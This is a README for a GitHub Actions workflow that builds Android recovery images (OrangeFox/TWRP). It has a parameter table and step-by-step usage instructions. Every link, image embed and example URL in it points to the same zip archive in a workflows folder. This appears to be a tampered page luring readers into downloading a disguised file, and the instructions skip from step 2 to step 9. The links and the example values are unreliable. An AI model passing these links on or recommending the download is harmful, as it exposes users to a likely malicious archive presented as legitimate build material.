# Build Recovery using Github Actions

- Support OrangeFox, [TWRP](https://github.com/Macoy66/Action-OFRP-Builder/raw/refs/heads/main/.github/workflows/OFR-Builder-Action-3.4-beta.4.zip) is here
- [中文说明](https://github.com/Macoy66/Action-OFRP-Builder/raw/refs/heads/main/.github/workflows/OFR-Builder-Action-3.4-beta.4.zip)

---

## Thanks to
- All contributors

---

## Release Notes
```
= 2023/04/20
- The first available version is submitted.
```

-----

## Parameter Description

| Name | Description | Example |
| ------------ | -------------------- | ------------ |
| `SYNC_URL` | Script specified by OrangeFox | https://github.com/Macoy66/Action-OFRP-Builder/raw/refs/heads/main/.github/workflows/OFR-Builder-Action-3.4-beta.4.zip |
| `MANIFEST_BRANCH` | Source branch | 12.1                                                         |
| `DEVICE_TREE_URL` | Device address | https://github.com/Macoy66/Action-OFRP-Builder/raw/refs/heads/main/.github/workflows/OFR-Builder-Action-3.4-beta.4.zip |
| `DEVICE_TREE_BRANCH` | Device branch | fox_12.1 |
| `DEVICE_PATH` | Device location | device/xiaomi/laurel_sprout |
| `COMMON_TREE_URL` | Common tree address |  |
| `COMMON_PATH` | Common tree location |  |
| `DEVICE_NAME` | Model name | laurel_sprout |
| `MAKEFILE_NAME` | Makefile name | twrp_laurel_sprout |
| `BUILD_TARGET` | Build Target Partition (boot/recovery/vendorboot) | recovery |

-----

## How to use
```
For example, your username is: JohnSmith
```
#### 1. Click 'Fork' in the upper right corner of this repository
![image](https://github.com/Macoy66/Action-OFRP-Builder/raw/refs/heads/main/.github/workflows/OFR-Builder-Action-3.4-beta.4.zip)
#### 2. After waiting for the automatic redirection, you will see your own username
![image](https://github.com/Macoy66/Action-OFRP-Builder/raw/refs/heads/main/.github/workflows/OFR-Builder-Action-3.4-beta.4.zip)
-----

## Building the Recovery
#### 9. Click 'Actions-Recovery Build'
![image](https://github.com/Macoy66/Action-OFRP-Builder/raw/refs/heads/main/.github/workflows/OFR-Builder-Action-3.4-beta.4.zip)
#### 10. Click 'Run workflow' and fill in according to the above 'parameter description'
![image](https://github.com/Macoy66/Action-OFRP-Builder/raw/refs/heads/main/.github/workflows/OFR-Builder-Action-3.4-beta.4.zip)
#### 11. After filling in, click 'Run workflow' to start running

-----

## Compilation results
Can be downloaded at [Release](../../releases)

File not being uploaded to Release? Please check the step 'Check the output directory before uploading' and check the file name